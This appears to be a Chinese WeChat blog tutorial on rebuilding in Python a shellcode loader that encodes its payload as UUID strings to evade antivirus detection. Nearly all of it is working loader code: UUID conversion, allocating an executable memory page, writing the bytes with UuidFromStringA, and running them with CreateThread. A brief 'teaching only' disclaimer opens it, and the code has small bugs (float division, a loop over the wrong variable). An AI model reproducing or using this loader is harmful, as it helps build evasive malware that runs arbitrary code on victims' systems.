> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TdRAiRuts0rSNOKqZxzzmw)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSPAlJwBIfrwAX1YiblLO82ANtoBIlvmT4zvhib5REPULYwmb6KpsiaWkXgO1ZhibA5UYWkGE9GsLktPmA/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

UUID 加载器  

前几天看到一个加载器很有意思，通过 UUID 转换方式将 shellcode 写入内存中  

loader 只有 C 语言的，今天用 python 尝试复现一下  

虽然不咋的免杀了，但可以扩宽我们将 shellcode 写入内存的知识面，条条大路通罗马啊

**（附视频↓↓↓）**

UUID 是啥

(我也不知道，百度的)

UUID: 通用唯一标识符 ( Universally Unique Identifier ), 对于所有的 UUID 它可以保证在空间和时间上的唯一性. 它是通过 MAC 地址, 时间戳, 命名空间, 随机数, 伪随机数来保证生成 ID 的唯一性, 有着固定的大小 (128 bit). 它的唯一性和一致性特点使得可以无需注册过程就能够产生一个新的 UUID. UUID 可以被用作多种用途, 既可以用来短时间内标记一个对象, 也可以可靠的辨别网络中的持久性对象.

字节转换 UUID

python 有根据十六进制字符串生成 UUID 的函数 uuid.UUID()  

https://docs.python.org/3/library/uuid.html

注意 16 个字节转换一个 uuid 值，\x00 是一个字节

当剩余字节数不满 16 个可添加 \x00 补充字节数

但注意啊！必须将全部的 shellcode 全部转化为 uuid

```
import uuid

scode = b'''\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\......'''
list = []
for i in range(len(scode)/16):
     bytes_a = scode[i*16:16+i*16]
     b = uuid.UUID(bytes_le=bytes_a)
     list.append(str(b))
print(list)
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPAlJwBIfrwAX1YiblLO82ANMlFU0nZY4byDwx2B8jMYL93ERiaf5wvL76xqmVKIibaC22U5S3tMbEqw/640?wx_fmt=png)

UUID 写入内存

将普通的内存加载器改了改，能用就行  

主要是了解 uuid 写入内存的实现过程

下面已经将 shellcode 转为了 uuid，并放在列表中

```
import ctypes
import requests
import base64

shellcode = ['e48348fc-e8f0-00c8-0000-415141505251', 'd2314856-4865-528b-6048-8b5218488b52'.......]
```

申请内存，注意申请内存的大小 len(shellcode)*16

有多少 uuid 值，它的 16 倍就是需要的内存大小

```
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode)*16, 0x1000, 0x40)
```

通过 UuidFromStringA 函数，将 uuid 值转为二进制并写进内存中去。

函数原型：https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringw

rwxpage1 是内存指针，表示从指定指针位置写入。

rwxpage1+=16 是控制指针的走路，每写入一个 uuid 二进制需要将指针移动 16 个字节，直到将 shellcode 全部写入

```
rwxpage1 = rwxpage
for i in list:
    ctypes.windll.Rpcrt4.UuidFromStringA(i,rwxpage1)
    rwxpage1+=16
```

shellcode 全部写入内存了，然后创建线程运行即可。  

```
handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
```

**详细操作可看录屏（建议电脑播放）**